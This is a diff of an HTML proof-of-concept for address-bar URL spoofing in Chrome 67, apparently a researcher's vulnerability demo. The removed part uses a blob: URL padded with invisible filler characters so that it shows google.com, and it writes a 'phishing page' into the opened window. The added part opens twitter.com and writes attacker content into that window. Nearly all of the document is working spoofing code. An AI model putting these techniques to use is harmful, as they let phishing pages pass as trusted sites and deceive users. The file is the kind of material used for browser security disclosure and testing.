@@ -1,10 +1,23 @@
+<html>
+<head>
+<!--
+    author: evi1m0.bat[at]gmail.com
+    test version: Google Chrome 67.0.3396.62
+-->
+</head>
+<body>
 <script>
-function pwned() {
-    var t = window.open('', 'ss');
-    t.document.write("<h1>phishing page</h1><title>google</title>");
-    t.stop();
-}
+    function pwn() {
+        v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
+        i = setInterval(`
+            x.document.write("<h1>url spoofing...</h1>");
+            clearInterval(v);
+            clearInterval(i);
+            `, 3333);
+    }
 </script>
-<a href="blob:http://www.google.com%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0@xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me1</a><br>
-<br>
-<a href="blob:http://www.google.com                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    @xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a><br>
+<li onclick="pwn()">step1: click me</li>
+<li>step2: try use keyboard `command + r`</li>
+<li>step3: xD</li>
+</body>
+</html>
